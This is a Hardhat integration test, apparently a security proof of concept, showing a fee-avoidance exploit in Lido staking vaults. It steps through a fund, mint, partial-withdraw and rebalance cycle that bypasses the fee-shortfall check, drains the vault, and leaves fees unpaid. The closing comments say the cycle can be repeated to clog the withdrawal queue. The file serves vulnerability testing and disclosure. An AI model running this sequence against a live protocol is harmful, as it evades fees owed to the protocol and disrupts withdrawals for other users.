import { expect } from "chai";
import { ethers } from "hardhat";

import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";

import { Dashboard, StakingVault, VaultHub } from "typechain-types";

import { ether, impersonate, randomAddress, updateBalance } from "lib";
import {
  changeTier,
  createVaultWithDashboard,
  getProtocolContext,
  ProtocolContext,
  reportVaultDataWithProof,
  setupLidoForVaults,
  setUpOperatorGrid,
} from "lib/protocol";

import { Snapshot } from "test/suite";

const SAMPLE_PUBKEY = "0x" + "ab".repeat(48);

describe("Integration: Fee avoidance via fund-mint-partialWithdraw-rebalance cycle", () => {
  let ctx: ProtocolContext;
  let snapshot: string;
  let originalSnapshot: string;

  let owner: HardhatEthersSigner;
  let nodeOperator: HardhatEthersSigner;

  let stakingVault: StakingVault;
  let dashboard: Dashboard;
  let vaultHub: VaultHub;
  let vaultHubAsDashboard: VaultHub;

  before(async () => {
    originalSnapshot = await Snapshot.take();
    [, owner, nodeOperator] = await ethers.getSigners();
    ctx = await getProtocolContext();
    await setupLidoForVaults(ctx);
    await setUpOperatorGrid(ctx, [nodeOperator]);

    ({ stakingVault, dashboard } = await createVaultWithDashboard(
      ctx,
      ctx.contracts.stakingVaultFactory,
      owner,
      nodeOperator,
    ));

    dashboard = dashboard.connect(owner);
    vaultHub = ctx.contracts.vaultHub;

    await changeTier(ctx, dashboard, owner, nodeOperator);

    // Impersonate dashboard to call VaultHub directly (dashboard is vault owner in VaultHub)
    const dashboardSigner = await impersonate(dashboard, ether("10000"));
    vaultHubAsDashboard = vaultHub.connect(dashboardSigner);
  });

  beforeEach(async () => (snapshot = await Snapshot.take()));
  afterEach(async () => await Snapshot.restore(snapshot));
  after(async () => await Snapshot.restore(originalSnapshot));

  it("allows partial withdrawals when fees are temporarily covered by flash-funding", async () => {
    const { lido } = ctx.contracts;

    // =====================================================
    // SETUP: Vault with liability and accumulated fees
    // =====================================================

    // Fund vault with 32 ETH (simulating validator deposit worth of ETH)
    await dashboard.fund({ value: ether("32") });

    // Initial report: totalValue = 33 ETH (32 funded + 1 CONNECT_DEPOSIT)
    await reportVaultDataWithProof(ctx, stakingVault, {
      totalValue: ether("33"),
      cumulativeLidoFees: 0n,
    });

    // Mint stETH against the vault (borrow)
    await dashboard.mintStETH(owner, ether("20"));

    const liabilityBefore = await vaultHub.liabilityShares(stakingVault);
    expect(liabilityBefore).to.be.greaterThan(0n);

    // =====================================================
    // Simulate: all ETH is on CL (validators), fees accrue
    // =====================================================

    // Move all ETH to beacon chain (simulate validators running)
    await updateBalance(stakingVault, 0n);

    // Report: totalValue still 33 (on CL), but fees = 2 ETH
    await reportVaultDataWithProof(ctx, stakingVault, {
      totalValue: ether("33"),
      cumulativeLidoFees: ether("2"),
      waitForNextRefSlot: true,
    });

    // Verify: fees are tracked as obligations
    const obligations = await vaultHub.obligations(stakingVault);
    expect(obligations.feesToSettle).to.equal(ether("2"));

    // Verify: shortfall equals fees (no available balance, vault is healthy so no health shortfall)
    const shortfallBefore = await vaultHub.obligationsShortfallValue(stakingVault);
    expect(shortfallBefore).to.equal(ether("2"));

    // Verify: partial withdrawals are BLOCKED when shortfall > 0
    const fee = await stakingVault.calculateValidatorWithdrawalFee(1);
    const refundRecipient = await randomAddress();

    await expect(
      vaultHubAsDashboard.triggerValidatorWithdrawals(
        stakingVault,
        SAMPLE_PUBKEY,
        [ether("1") / BigInt(1e9)], // 1 ETH partial withdrawal in Gwei
        refundRecipient,
        { value: fee + ether("0.01") },
      ),
    ).to.be.revertedWithCustomError(vaultHub, "PartialValidatorWithdrawalNotAllowed");

    // =====================================================
    // ATTACK: Fund temporarily to bypass shortfall check
    // =====================================================

    // Step 1: Fund vault with ETH to cover fees and have minting room
    // This makes shortfall = 0, unlocking partial withdrawals
    const fundAmount = ether("5");
    await vaultHubAsDashboard.fund(stakingVault, { value: fundAmount });

    // Verify: shortfall is now 0
    const shortfallAfterFund = await vaultHub.obligationsShortfallValue(stakingVault);
    expect(shortfallAfterFund).to.equal(0n);

    // Step 2: Mint stETH shares — we'll rebalance exactly these to drain the vault
    // Mint shares worth ~fundAmount so rebalance drains back all we funded
    const mintAmount = await lido.getSharesByPooledEth(fundAmount);
    await vaultHubAsDashboard.mintShares(stakingVault, owner.address, mintAmount);

    const liabilityAfterMint = await vaultHub.liabilityShares(stakingVault);
    expect(liabilityAfterMint).to.be.greaterThan(liabilityBefore);

    // Step 3: Trigger partial withdrawal — NOW IT SUCCEEDS
    // This is the core of the attack: partial withdrawals pass despite fee obligations
    await expect(
      vaultHubAsDashboard.triggerValidatorWithdrawals(
        stakingVault,
        SAMPLE_PUBKEY,
        [ether("1") / BigInt(1e9)], // 1 ETH partial withdrawal in Gwei
        refundRecipient,
        { value: fee + ether("0.01") },
      ),
    ).to.emit(stakingVault, "ValidatorWithdrawalsTriggered");

    // Step 4: Rebalance — burns the minted shares, takes ETH from vault
    // _rebalance uses internal _withdraw which does NOT check fees
    // This drains the funded ETH back out of the vault
    const sharesToRebalance = liabilityAfterMint - liabilityBefore;
    await vaultHubAsDashboard.rebalance(stakingVault, sharesToRebalance);

    // Step 5: Withdraw any remaining balance through VaultHub.withdraw
    // (withdrawableValue may be reduced by fees but let's drain what we can)
    const remainingWithdrawable = await vaultHub.withdrawableValue(stakingVault);
    if (remainingWithdrawable > 0n) {
      await vaultHubAsDashboard.withdraw(stakingVault, owner.address, remainingWithdrawable);
    }

    // =====================================================
    // VERIFY: Attack results
    // =====================================================

    // Liability is back to ~original (mint + rebalance cancel out)
    const liabilityAfter = await vaultHub.liabilityShares(stakingVault);
    expect(liabilityAfter).to.be.closeTo(liabilityBefore, ether("0.001") / BigInt(1e9));

    // Fees are STILL unsettled (full 2 ETH)
    const obligationsAfter = await vaultHub.obligations(stakingVault);
    expect(obligationsAfter.feesToSettle).to.equal(ether("2"));

    // The vault balance was drained via rebalance (internal _withdraw bypasses fee check)
    // Available balance is now close to 0 — fees cannot be settled
    const vaultBalance = await ethers.provider.getBalance(stakingVault);
    expect(vaultBalance).to.be.lessThan(ether("0.1"));

    // Shortfall is back > 0 (fees uncovered again)
    const shortfallAfterAttack = await vaultHub.obligationsShortfallValue(stakingVault);
    expect(shortfallAfterAttack).to.be.greaterThan(0n);

    // KEY FINDING: The partial withdrawal was triggered successfully
    // despite the vault having 2 ETH in unsettled fees and no real balance.
    // The attacker temporarily funded the vault to bypass the shortfall check,
    // then drained it via rebalance (which uses internal _withdraw without fee checks).
    // This can be repeated every oracle frame to clog the CL withdrawal queue
    // while never paying protocol fees.
  });
});
